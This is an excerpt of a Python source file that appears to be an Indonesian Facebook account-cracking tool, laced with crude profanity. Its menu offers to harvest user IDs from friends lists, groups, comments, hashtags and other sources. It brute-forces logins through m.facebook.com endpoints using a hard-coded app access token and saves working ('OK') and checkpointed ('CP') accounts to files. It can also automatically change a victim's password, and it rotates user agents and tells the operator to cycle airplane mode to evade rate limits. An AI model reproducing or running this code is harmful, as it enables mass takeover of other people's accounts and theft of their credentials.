...
# __kontol__memek__kontol__memek__kontol__memek__
# memek__kontol__memek__kontol__memek__kontol__memek__kontol
# __kontol__memek__kontol__memek__kontol__memek__
# memek__kontol__memek__kontol__memek__kontol__memek__kontol
...
data_change_2 = {}
data_user = []
header_grup = {"user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLP8Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
...
### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
...
def menu_log():
    ...
    elif pmu in ['0','00','000','z']:jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P));jalan('%s╚══[%s!%s] %sSemoga Harimu Suram......\n'%(O,P,O,P));time.sleep(3);bersih();clear();_cici_cici_()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu_log()
...
def menu():
    ...
    try:
        ...
        status = 'Lo Jomblo Kentod';users = '-';maile = '-';kunci = '-';bergabung = '-';kadaluarsa = '-';pro = ("%s[%sPro%s]"%(O,P,O));upgrade = ('Anda Sudah Versi %sPro'%(O));jid = ('%s[%s\x1b[0;93m5000%s]'%(O,P,O));W = H;Y = P
        try:
            _dapunta_ = _dapunta_dapunta_("token.txt","r").read();_cici_ = _dapunta_dapunta_("cookies.txt","r").read();_salsabila_ = {"cookie" : _cici_}
            if 'null' in _cici_:status_cookies = ('%sTidak'%(M));W = H;Y = P
            else:status_cookies = ('%sYa'%(H));W = H; Y = P
    ...
    _update_ = 'V1.6'
    _dapunta_cici_('%s╔══[ %sSelamat Datang \x1b[0;96m%s \x1b[0;97mNgentod %s]'%(O,P,n,O))
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sYour ID : \x1b[0;96m%s'%(O,P,O,P,i))
    _dapunta_cici_('%s╠══[%s•%s] %sYour IP : \x1b[0;96m%s'%(O,P,O,P,ip))
    #_dapunta_cici_('%s╠══[%s•%s] %sToken/Cookies : %sYa%s/%s'%(O,P,O,P,H,P,status_cookies))
    #_dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s•%s] %sStatus  : \x1b[0;96m%s'%(O,P,O,P,status))
    ...
    _dapunta_cici_('%s║'%(O))
    _dapunta_cici_('%s╠══[%s01%s] %sCrack ID Dari Teman Publik %s'%(O,P,O,P,jid))
    _dapunta_cici_('%s╠══[%s02%s] %sCrack ID Dari Pengikut %s'%(O,P,O,P,jid))
    _dapunta_cici_('%s╠══[%s03%s] %sCrack ID Dari  Pencarian Nama'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s04%s] %sCrack ID Dari Daftar Pesan'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s05%s] %sCrack ID Dari Like Postingan'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s06%s] %sCrack ID Dari Komentar Post'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s07%s] %sCrack ID Dati Anggota Grup'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s08%s] %sCrack ID Dari Dari File'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s09%s] %sCrack ID Dari Email'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s10%s] %sCrack Melalui Username'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s11%s] %sCrack ID Dari Hashtag'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s12%s] %sCrack ID Dari Beranda'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s13%s] %sCrack ID Dari Pertemanan Masuk'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s14%s] %sCrack ID Dari  Pertemanan Keluar'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s15%s] %sMengambil Data Target'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s16%s] %sMengambil Jumlah Teman \x1b[0;96m[\x1b[0;93mDump ID Goblok\x1b[0;96m]'%(O,P,O,P))
    _dapunta_cici_('%s╠══[%s17%s] %sCek Opsi Akun Checkpoin'%(O,P,O,P))
    ...
    _dapunta_cici_('%s╠══[%s00%s] %sKeluar \x1b[0;96m[\x1b[0;93mAhh Ngecrot\x1b[0;96m]'%(O,P,O,P))
...
def log_api_1(em,pas):
    ...
    response = r.get('https://m.facebook.com/login.phpformat=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.m.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
...
def log_api_2(em,pas):
    ...
    p = 'https://m.facebook.com/login.php'
        ...
        if len(_check_opsi_)==0:
            if "Lihat detail login yang ditampilkan. Ini Anda?" in _title_dev_:
                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
                    ...
                    if cek_pilih_opsi == 'Ya':_dapunta_cici_(format);_dapunta_cici_('    %s• %sAkun One Tap Nih Ngab'%(H,H));_dapunta_cici_("")
                    else:_dapunta_cici_(format);_dapunta_cici_('    %s• %sAkun One Tap Nih Ngab'%(H,H))
            else:pass
            ...
            if cek_pilih_opsi == 'Ya':
                ...
                jumop = ('%s    Terdapat %s Opsi : '%(P,str(len(jumlah_opsi))));_dapunta_cici_(format);_dapunta_cici_(jumop+"".join(jumlah_opsi));_dapunta_cici_("")
...
def hasil():
    ...
    jalan('%s╔══[ %sHasil Crack %s]'%(O,P,O));_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s1%s] %sCek Hasil Crack Akun OK'%(O,P,O,P));_dapunta_cici_('%s╠══[%s2%s] %sCek Hasil Akun CP'%(O,P,O,P));ch = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if ch in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
        ...
        try:
            ...
            try:
                ...
                del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "");_dapunta_cici_('\n%s╔══[%s•%s] %sTotal Hasil Crack Pada %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
...
def cek_hasil():
    ...
    auto_ganti_pass('Ya');_dapunta_cici_("%s╚══[%s•%s] %sTotal Akun Adalah : %s"%(O,P,O,P,str(len(buka_baju))));_dapunta_cici_("")
...
def started():
    ...
    _dapunta_cici_('%s╠══[%s•%s] %sAkun \x1b[0;92mOK \x1b[0;97mDisimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╠══[%s•%s] %sAkun \x1b[0;93mCP \x1b[0;97mDisimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
    _dapunta_cici_('%s╚══[%s•%s] %sMode Pesawatkan [5 Detik] Setiap 3 Menit!!\n'%(O,P,O,P))
